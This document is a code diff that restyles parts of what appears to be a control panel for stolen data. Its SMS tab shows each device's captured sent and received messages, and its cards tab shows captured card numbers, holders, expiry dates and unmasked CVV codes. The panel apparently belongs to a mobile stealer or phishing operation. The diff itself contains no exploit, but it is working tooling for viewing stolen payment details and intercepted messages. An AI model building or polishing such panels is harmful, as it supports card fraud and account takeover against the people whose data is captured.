@@ -824,31 +824,28 @@ include_once __DIR__ . '/header.php';
 
                 <div style={{ padding: '1.5rem', overflowY: 'auto', flex: 1 }}>
                   {tab === 'sms' && (
-                    <div style={{ overflowX: 'auto', width: '100%' }}>
-                      <table className="data-table">
-                        <thead>
-                          <tr>
-                            <th>Sender</th>
-                            <th>Type</th>
-                            <th>Message Body</th>
-                            <th>Timestamp</th>
-                          </tr>
-                        </thead>
-                        <tbody>
-                          {(selectedUser.smsDataList || []).map((sms, i) => (
-                            <tr key={i}>
-                              <td style={{ color: '#818cf8', fontWeight: 600, whiteSpace: 'nowrap' }}>{getSmsSender(sms)}</td>
-                              <td style={{ whiteSpace: 'nowrap' }}>
-                                <span style={{ fontSize: '0.72rem', padding: '3px 7px', borderRadius: '6px', fontWeight: 700, background: sms.type === 'SENT' ? 'rgba(236,72,153,0.15)' : 'rgba(52,211,153,0.15)', color: sms.type === 'SENT' ? '#f472b6' : '#34d399' }}>
-                                  {sms.type === 'SENT' ? '📤 SENT' : '📥 INBOX'} ({getSmsSimSlot(sms)})
-                                </span>
-                              </td>
-                              <td style={{ wordBreak: 'break-word', minWidth: '220px' }}>{getSmsBody(sms)}</td>
-                              <td style={{ color: '#9ca3af', fontSize: '0.8rem', whiteSpace: 'nowrap' }}>{getSmsTimestamp(sms)}</td>
-                            </tr>
-                          ))}
-                        </tbody>
-                      </table>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '0.85rem' }}>
+                      {(selectedUser.smsDataList || []).map((sms, i) => (
+                        <div key={i} className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(99,102,241,0.3)', background: 'rgba(99,102,241,0.05)', display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '6px' }}>
+                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                              <strong style={{ color: '#818cf8', fontSize: '0.95rem' }}>{getSmsSender(sms)}</strong>
+                              <span style={{ fontSize: '0.72rem', padding: '3px 7px', borderRadius: '6px', fontWeight: 700, background: sms.type === 'SENT' ? 'rgba(236,72,153,0.15)' : 'rgba(52,211,153,0.15)', color: sms.type === 'SENT' ? '#f472b6' : '#34d399' }}>
+                                {sms.type === 'SENT' ? '📤 SENT' : '📥 INBOX'} ({getSmsSimSlot(sms)})
+                              </span>
+                            </div>
+                            <span style={{ fontSize: '0.8rem', color: '#9ca3af' }}>{getSmsTimestamp(sms)}</span>
+                          </div>
+                          <div style={{ fontSize: '0.92rem', color: '#e2e8f0', background: 'rgba(17,24,39,0.75)', padding: '10px 12px', borderRadius: '10px', wordBreak: 'break-word', border: '1px solid rgba(255,255,255,0.06)' }}>
+                            {getSmsBody(sms)}
+                          </div>
+                        </div>
+                      ))}
+                      {(!selectedUser.smsDataList || selectedUser.smsDataList.length === 0) && (
+                        <div style={{ textAlign: 'center', color: '#9ca3af', padding: '2rem' }}>
+                          No SMS messages captured for this device yet.
+                        </div>
+                      )}
                     </div>
                   )}
 
@@ -943,35 +940,57 @@ include_once __DIR__ . '/header.php';
                   )}
 
                   {tab === 'cards' && (
-                    <div style={{ overflowX: 'auto', width: '100%' }}>
-                      <table className="data-table">
-                        <thead>
-                          <tr>
-                            <th>Bank Name</th>
-                            <th>Card Type</th>
-                            <th>Card Number</th>
-                            <th>Card Holder</th>
-                            <th>Expiry</th>
-                            <th>CVV</th>
-                          </tr>
-                        </thead>
-                        <tbody>
-                          {(selectedUser.cardDataList || []).map((card, i) => (
-                            <tr key={i}>
-                              <td style={{ whiteSpace: 'nowrap' }}><strong style={{ color: '#818cf8' }}>{getCardBankName(card)}</strong></td>
-                              <td style={{ whiteSpace: 'nowrap' }}>
-                                <span style={{ fontSize: '0.75rem', padding: '3px 8px', borderRadius: '12px', background: 'rgba(236,72,153,0.15)', color: '#f472b6', fontWeight: 600 }}>
-                                  {getCardType(card)}
-                                </span>
-                              </td>
-                              <td style={{ whiteSpace: 'nowrap' }}><code style={{ color: '#f472b6' }}>{getCardNumber(card)}</code></td>
-                              <td style={{ whiteSpace: 'nowrap' }}>{getCardHolder(card)}</td>
-                              <td style={{ whiteSpace: 'nowrap' }}>{getCardExpiry(card)}</td>
-                              <td style={{ whiteSpace: 'nowrap' }}><code style={{ color: '#f87171' }}>{getCardCvv(card)}</code></td>
-                            </tr>
-                          ))}
-                        </tbody>
-                      </table>
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
+                      {(selectedUser.cardDataList || []).map((card, i) => (
+                        <div key={i} className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(236,72,153,0.35)', background: 'rgba(236,72,153,0.05)' }}>
+                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.85rem', flexWrap: 'wrap', gap: '6px' }}>
+                            <h4 style={{ color: '#f472b6', fontSize: '1.05rem', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                              <span>💳 {getCardBankName(card)}</span>
+                            </h4>
+                            <span className="pulse-badge" style={{ background: 'rgba(236,72,153,0.15)', color: '#f472b6', fontWeight: 700, fontSize: '0.75rem' }}>
+                              {getCardType(card)}
+                            </span>
+                          </div>
+
+                          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))', gap: '0.85rem' }}>
+                            <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(248,113,113,0.4)' }}>
+                              <div style={{ fontSize: '0.72rem', color: '#f87171', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>CARD NUMBER</div>
+                              <div style={{ fontSize: '1.05rem', color: '#fff', fontWeight: 700, marginTop: '4px', letterSpacing: '1px', fontFamily: 'monospace' }}>
+                                {getCardNumber(card)}
+                              </div>
+                            </div>
+
+                            <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(255,255,255,0.08)' }}>
+                              <div style={{ fontSize: '0.72rem', color: '#9ca3af', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>CARD HOLDER</div>
+                              <div style={{ fontSize: '0.95rem', color: '#fff', fontWeight: 600, marginTop: '4px' }}>
+                                {getCardHolder(card)}
+                              </div>
+                            </div>
+
+                            <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(255,255,255,0.08)' }}>
+                              <div style={{ fontSize: '0.72rem', color: '#9ca3af', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>EXPIRY DATE</div>
+                              <div style={{ fontSize: '0.95rem', color: '#38bdf8', fontWeight: 600, marginTop: '4px' }}>
+                                {getCardExpiry(card)}
+                              </div>
+                            </div>
+
+                            <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(248,113,113,0.4)' }}>
+                              <div style={{ fontSize: '0.72rem', color: '#f87171', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px', display: 'flex', justifyContent: 'space-between' }}>
+                                <span>CVV CODE</span>
+                                <span>🔑 UNMASKED</span>
+                              </div>
+                              <div style={{ fontSize: '1.05rem', color: '#f87171', fontWeight: 700, marginTop: '4px', fontFamily: 'monospace' }}>
+                                {getCardCvv(card)}
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      ))}
+                      {(!selectedUser.cardDataList || selectedUser.cardDataList.length === 0) && (
+                        <div style={{ textAlign: 'center', color: '#9ca3af', padding: '2rem' }}>
+                          No card details captured for this device yet.
+                        </div>
+                      )}
                     </div>
                   )}
                   {tab === 'forward' && (
